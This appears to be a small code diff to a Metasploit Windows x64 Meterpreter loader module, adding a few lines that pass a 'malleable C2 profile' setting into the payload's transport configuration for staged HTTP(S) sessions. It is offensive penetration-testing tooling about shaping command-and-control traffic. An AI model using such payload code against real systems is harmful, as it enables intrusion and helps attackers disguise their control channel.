@@ -74,7 +74,14 @@ module Payload::Windows::MeterpreterLoader_x64
   def generate_config(opts={})
     ds = opts[:datastore] || datastore
     opts[:uuid] ||= generate_payload_uuid
-
+    # Pass the malleable C2 profile through to the transport config so
+    # that staged HTTP(S) meterpreter sessions honour the profile after
+    # the stage is delivered. The option is only registered by HTTP(S)
+    # stagers, so it's nil (and ignored) for other transports.
+    opts[:c2_profile] ||= ds['MALLEABLEC2'] if options.include?('MALLEABLEC2')
+    if opts[:c2_profile]
+      opts[:stageless] = true
+    end
     # create the configuration block, which for staged connections is really simple.
     config_opts = {
       arch:              opts[:uuid].arch,
